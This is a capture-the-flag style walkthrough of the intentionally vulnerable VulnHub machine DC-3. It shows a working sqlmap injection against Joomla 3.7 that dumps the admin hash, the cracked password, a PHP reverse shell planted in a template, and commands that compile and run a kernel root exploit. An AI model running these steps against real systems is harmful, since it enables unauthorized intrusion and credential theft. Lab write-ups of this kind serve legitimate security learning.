---
layout: "post"
title: "DC 3 Walkthrough"
categories: [vulnhub]
---
DC-3 was an easy machine. The website was hosted on Joomla. There was a sqli exploit that gives the admin password. By using an admin panel upload the shell. Priv sec using CVE.  

# Summery

- Portscan
- `Gobuster` to findout directories
- Search exploit
- Use `sqlmap` to get admin password
- Crack the password using `John`
- Login to admin panel and inject reverse shell
- Get reverse shell
- Exploit Kernel using CVE 
- Getting Root
- Flag

# Recon

## Portscan

```
Nmap scan report for 192.168.1.7
Host is up (0.00030s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home

```
## Joomla

When I browse the website, I don't find out anything interesting.
![mainpage](/assets/img/dc-3/mainpage.png)
So, I started the gobuster to find out directories.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.7 -x php,txt,html

/images (Status: 301)
/media (Status: 301)
/templates (Status: 301)
/modules (Status: 301)
/index.php (Status: 200)
/plugins (Status: 301)
/bin (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/README.txt (Status: 200)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/tmp (Status: 301)
/LICENSE.txt (Status: 200)
/layouts (Status: 301)
/administrator (Status: 301)
/configuration.php (Status: 200)
/htaccess.txt (Status: 200)
/cli (Status: 301)
/server-status (Status: 403)

```
# Sqli
The `README.txt` file revels the webserver is running Joomla and its version is 3.7.
![readme](/assets/img/dc-3/readme.png)
I search the exploit on searchsploit and get the exploit for Joomla. 
![searchsploit joomla](/assets/img/dc-3/searchsploit-joomla.png)

The exploit `php/webapps/42033.txt` tells that version is vulnerable to sqli.
So as per exploit I run sqlmap and get admin hash.

```bash
sqlmap -u "http://192.168.1.7/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump 
```

>admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu

I use `John` to crack the password.
![john](/assets/img/dc-3/john.png)

>admin:snoopy

# Getting reverse shell.
Now I have username and password, I use those to log in to `Joomla`. By using admin panel I can edit the template files. So I paste the source code of php-reverse-shell in error.php of beez3 template and
get a reverse shell.
![shell](/assets/img/dc-3/shell.png)
![nc](/assets/img/dc-3/nc.png)

# Getting Root

I upload [linpeas](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh) on server and run it. 
![ubuntu](/assets/img/dc-3/ubuntu.png)
The exploit is available on `searchsploit` for *ubuntu 16.04*
![exploit](/assets/img/dc-3/searchsploit-exploit.png)

I download the [exploit](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip) from net and transfer to server. By executing the exploit I get root access.
```bash
unzip 39772.zip
cd 39772
tar xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit/
./compile.sh
./doubleput
```
![1](/assets/img/dc-3/1.png)
![2](/assets/img/dc-3/2.png)

# The Flag
![root](/assets/img/dc-3/root.png)


 

